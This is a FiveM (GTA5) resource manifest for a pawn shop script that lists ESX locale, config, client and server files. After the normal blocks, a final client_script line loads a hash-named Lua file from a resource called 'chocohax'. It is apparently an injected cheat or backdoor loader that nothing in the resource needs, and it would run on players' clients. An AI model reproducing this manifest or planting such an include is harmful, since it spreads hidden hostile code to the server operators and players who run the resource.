fx_version 'adamant'

game 'gta5'

version '1.0.0'

description 'Eric Pawn Shop'

client_scripts {
    "@es_extended/locale.lua",
    "locales/*.lua",
    "config.lua",
    "client.lua"
}

server_scripts {
    "@es_extended/locale.lua",
    "locales/*.lua",
    "config.lua",
    "server.lua",
}
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'